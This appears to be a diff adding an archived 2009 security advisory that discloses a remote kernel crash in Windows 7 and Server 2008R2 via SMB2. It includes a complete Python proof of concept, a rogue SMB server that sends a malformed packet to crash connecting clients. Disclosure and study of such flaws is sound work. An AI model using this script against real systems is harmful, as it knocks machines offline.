@@ -1,0 +1,56 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0058)http://marc.info/?l=full-disclosure&m=125793716913077&q=p5 -->
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<META content="MSHTML 6.00.6000.17023" name=GENERATOR></HEAD>
+<BODY>=============================================<BR>- Release date: November 
+11th, 2009<BR>- Discovered by: Laurent Gaffié<BR>- Severity: 
+Medium/High<BR>=============================================<BR><BR>I. 
+VULNERABILITY<BR>-------------------------<BR>Windows 7 * , Server 2008R2 Remote 
+Kernel Crash<BR><BR>II. 
+BACKGROUND<BR>-------------------------<BR>#FAIL,#FAIL,#FAIL<BR>SDL FAIL, 'Most 
+Secure Os Ever' --&gt; Remote Kernel in 2 mn.<BR>#FAIL,#FAIL,#FAIL<BR><BR>III. 
+DESCRIPTION<BR>-------------------------<BR>See : <A 
+href="http://g-laurent.blogspot.com/">http://g-laurent.blogspot.com/</A> for 
+much more details<BR><BR>#Comment: This bug is specific Windows 
+7/2008R2.<BR><BR>IV. PROOF OF 
+CONCEPT<BR>-------------------------<BR>#win7-crash.py:<BR>#Trigger a remote 
+kernel crash on Win7 and server 2008R2 (infinite loop)<BR>#Crash in 
+KeAccumulateTicks() due to NT_ASSERT()/DbgRaiseAssertionFailure() caused by an 
+infinite loop.<BR>#NO BSOD, YOU GOTTA PULL THE PLUG.<BR>#To trigger it fast from 
+the target: \\this_script_ip_addr\BLAH , instantly crash <BR>#Author: Laurent 
+Gaffié<BR>#<BR><BR>import SocketServer<BR><BR>packet = "\x00\x00\x00\x9a" # 
+---&gt; length should be 9e not 9a.. 
+<BR>"\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00"<BR>"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"<BR>"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"<BR>"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"<BR>"\x41\x00\x01\x00\x02\x02\x00\x00\x30\x82\xa4\x11\xe3\x12\x23\x41"<BR>"\xaa\x4b\xad\x99\xfd\x52\x31\x8d\x01\x00\x00\x00\x00\x00\x01\x00"<BR>"\x00\x00\x01\x00\x00\x00\x01\x00\xcf\x73\x67\x74\x62\x60\xca\x01"<BR>"\xcb\x51\xe0\x19\x62\x60\xca\x01\x80\x00\x1e\x00\x20\x4c\x4d\x20"<BR>"\x60\x1c\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x12\x30\x10\xa0\x0e"<BR>"\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"<BR><BR><BR>class 
+SMB2(SocketServer.BaseRequestHandler):<BR><BR>&nbsp;&nbsp;&nbsp; def 
+handle(self):<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "Who:", 
+self.client_address<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; input = 
+self.request.recv(1024)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+self.request.send(packet)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+self.request.close()<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>launch = 
+SocketServer.TCPServer(('', 445),SMB2)# listen all interfaces port 
+445<BR>launch.serve_forever()<BR><BR>#SDL FAILED<BR><BR>V. BUSINESS 
+IMPACT<BR>-------------------------<BR>An attacker can remotly crash any Windows 
+7/Server 2008R2.<BR><BR><BR>VI. SYSTEMS 
+AFFECTED<BR>-------------------------<BR>Windows 7, Windowns Server 
+2008R2<BR><BR>VII. SOLUTION<BR>-------------------------<BR>No patch available 
+for the moment, your vendor do not care.<BR>Close SMB feature and ports, until a 
+real audit is provided.<BR><BR>VIII. 
+REFERENCES<BR>-------------------------<BR><A 
+href="http://blogs.msdn.com/sdl/">http://blogs.msdn.com/sdl/</A><BR><A 
+href="http://g-laurent.blogspot.com/">http://g-laurent.blogspot.com/</A><BR><A 
+href="http://twitter.com/g_laurent">http://twitter.com/g_laurent</A><BR>IX. 
+CREDITS<BR>-------------------------<BR>This vulnerability has been discovered 
+by Laurent Gaffié<BR>Laurent.gaffie{remove-this}(at)<A 
+href="http://gmail.com/">gmail.com</A><BR><BR>X. REVISION 
+HISTORY<BR>-------------------------<BR>November 8th, 2009: MSRC 
+contacted<BR>November 8th, 2009: MSRC acknoledge the vuln<BR>November 11th, 
+2009: MRSC try to convince me that multi-vendor-ipv6 bug shouldn't appears on a 
+security bulletin.<BR>November 11th, 2009: Win 7 remote kernel smash 
+released<BR><BR>XI. LEGAL NOTICES<BR>-------------------------<BR>The 
+information contained within this advisory is supplied "as-is"<BR>with no 
+warranties or guarantees of fitness of use or otherwise.<BR>I accept no 
+responsibility for any damage caused by the use or<BR>misuse of this 
+information.<BR><BR>XII.Personal Notes<BR>-------------------------<BR>More 
+Remote Kernel FD @MS to come.<BR><BR><BR></BODY></HTML>
